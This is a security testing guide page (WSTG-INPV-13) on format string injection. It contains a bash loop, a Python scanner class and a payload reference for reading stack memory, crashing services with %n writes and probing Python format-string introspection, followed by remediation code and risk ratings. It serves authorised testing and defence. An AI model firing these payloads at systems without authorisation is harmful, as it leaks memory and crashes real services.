# WSTG-INPV-13: Testing for Format String Injection

## Test ID
WSTG-INPV-13

## Test Name
Testing for Format String Injection

## High-Level Description

Format String vulnerabilities occur when user input is used as the format string argument in functions like printf, sprintf, fprintf (C/C++) or similar functions in other languages. Attackers can read from or write to memory, crash applications, or achieve code execution.

---

## What to Check

- [ ] Printf-family functions with user input
- [ ] Log functions with format strings
- [ ] Error messages with format strings
- [ ] Memory disclosure via %x, %p
- [ ] Application crashes via %n

---

## How to Test

### Step 1: Test Format String Injection

```bash
#!/bin/bash
TARGET="https://target.com/api"

echo "[*] Testing for Format String Injection..."

# Format string payloads
PAYLOADS=(
    "%s%s%s%s%s"
    "%x%x%x%x%x"
    "%p%p%p%p%p"
    "%n%n%n%n%n"
    "AAAA%08x.%08x.%08x"
    "%d%d%d%d%d"
    "%.16705x%n"
)

for payload in "${PAYLOADS[@]}"; do
    encoded=$(echo -n "$payload" | jq -sRr @uri)
    response=$(curl -s "$TARGET?name=$encoded")
    echo "Payload: $payload"
    echo "Response: ${response:0:100}"
    echo "---"
done
```

### Step 2: Format String Tester

```python
#!/usr/bin/env python3
"""
Format String Vulnerability Tester
"""

import requests
import re

class FormatStringTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # Format string payloads
    PAYLOADS = {
        'detection': [
            # Memory read
            "%x" * 10,
            "%p" * 10,
            "%s" * 5,
            "%d" * 10,

            # Stack reading
            "AAAA%08x.%08x.%08x.%08x",
            "%08x." * 20,
            "%p." * 20,

            # Direct parameter access
            "%1$x",
            "%2$x",
            "%3$x",
            "%10$x",
        ],
        'crash': [
            # %n writes (dangerous - can crash)
            "%n" * 5,
            "%s%s%s%s%s%s%s%s%s%s",
        ],
        'memory_read': [
            # Read specific stack positions
            "%1$s",
            "%2$s",
            "%3$s",
            "%4$s",
            "%5$s",
            # Hex dump
            "%1$08x",
            "%2$08x",
            "%3$08x",
        ],
    }

    def test_format_string(self, param='name'):
        """Test for format string vulnerability"""
        print("\n[*] Testing for format string injection...")

        # Get baseline response
        baseline_response = self.session.get(
            self.url,
            params={param: 'AAAA'}
        )
        baseline_text = baseline_response.text

        for payload in self.PAYLOADS['detection']:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload}
                )

                # Check for memory disclosure (hex addresses)
                hex_pattern = re.findall(r'[0-9a-fA-F]{8,16}', response.text)

                # Filter out common false positives
                suspicious_hex = [h for h in hex_pattern if h not in baseline_text]

                if len(suspicious_hex) > 3:
                    print(f"[VULN] Format String - Memory Disclosure!")
                    print(f"  Payload: {payload}")
                    print(f"  Leaked addresses: {suspicious_hex[:5]}")
                    self.findings.append({
                        'type': 'Format String - Memory Disclosure',
                        'payload': payload,
                        'severity': 'High'
                    })
                    return True

                # Check if format specifiers are processed
                if payload in response.text:
                    # Not vulnerable - payload reflected literally
                    pass
                elif '%' not in response.text and ('0x' in response.text or
                     re.search(r'\b[0-9a-f]{8}\b', response.text, re.IGNORECASE)):
                    print(f"[WARN] Possible format string processing")
                    print(f"  Payload: {payload}")

            except Exception as e:
                if '%n' in payload:
                    print(f"[VULN] Application crashed with %n!")
                    self.findings.append({
                        'type': 'Format String - Crash',
                        'payload': payload,
                        'severity': 'High'
                    })

        return False

    def test_stack_reading(self, param='name'):
        """Attempt to read stack contents"""
        print("\n[*] Attempting stack reading...")

        # Try to read sequential stack positions
        for i in range(1, 20):
            payload = f"%{i}$x"
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload}
                )

                # Check if we got hex output
                if re.search(r'^[0-9a-fA-F]+$', response.text.strip()):
                    print(f"  Position {i}: {response.text.strip()}")
                    self.findings.append({
                        'type': 'Format String - Stack Read',
                        'position': i,
                        'value': response.text.strip(),
                        'severity': 'High'
                    })

            except Exception as e:
                pass

    def test_python_format(self, param='name'):
        """Test Python format string injection"""
        print("\n[*] Testing Python format string injection...")

        python_payloads = [
            "{0.__class__.__mro__[1].__subclasses__()}",
            "{config}",
            "{self}",
            "{.__globals__}",
            "{{7*7}}",  # For template engines
        ]

        for payload in python_payloads:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload}
                )

                if 'class' in response.text or 'subclasses' in response.text:
                    print(f"[VULN] Python format string injection!")
                    self.findings.append({
                        'type': 'Python Format String',
                        'payload': payload,
                        'severity': 'High'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("FORMAT STRING INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo format string vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload']}")

    def run_tests(self, param='name'):
        """Run all format string tests"""
        self.test_format_string(param)
        self.test_stack_reading(param)
        self.test_python_format(param)
        self.generate_report()

# Usage
tester = FormatStringTester("https://target.com/api/greet")
tester.run_tests()
```

### Step 3: Format String Payload Reference

```
# Memory Reading (C/C++)
%x      - Read stack (hex)
%p      - Read stack (pointer)
%s      - Read string from stack address
%d      - Read stack (decimal)

# Direct Parameter Access
%n$x    - Read nth parameter as hex
%n$s    - Read string at nth parameter
%n$p    - Read nth parameter as pointer

# Memory Writing (dangerous)
%n      - Write number of chars printed
%hn     - Write short
%hhn    - Write char

# Stack Dump
AAAA%08x.%08x.%08x.%08x.%08x

# Python Format String
{config}
{self.__class__.__mro__}
{0.__class__.__bases__[0].__subclasses__()}
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Parameter fuzzing |
| fuzzers | Automated testing |
| gdb/lldb | Binary analysis |

---

## Remediation

```c
// C - Never use user input as format string
// VULNERABLE
printf(user_input);
sprintf(buffer, user_input);

// SECURE
printf("%s", user_input);
sprintf(buffer, "%s", user_input);
```

```python
# Python - Use .format() safely or f-strings
# VULNERABLE
print(user_input.format(config=secret))

# SECURE
print("{}".format(user_input))
print(f"{user_input}")
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| Format string RCE | 9.8 | Critical |
| Memory disclosure | 7.5 | High |
| Application crash | 7.5 | High |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-134** | Use of Externally-Controlled Format String |

---

## Checklist

```
[ ] Printf-style functions tested
[ ] Memory disclosure tested
[ ] Stack reading tested
[ ] Application crash tested
[ ] Python format tested
[ ] Findings documented
```
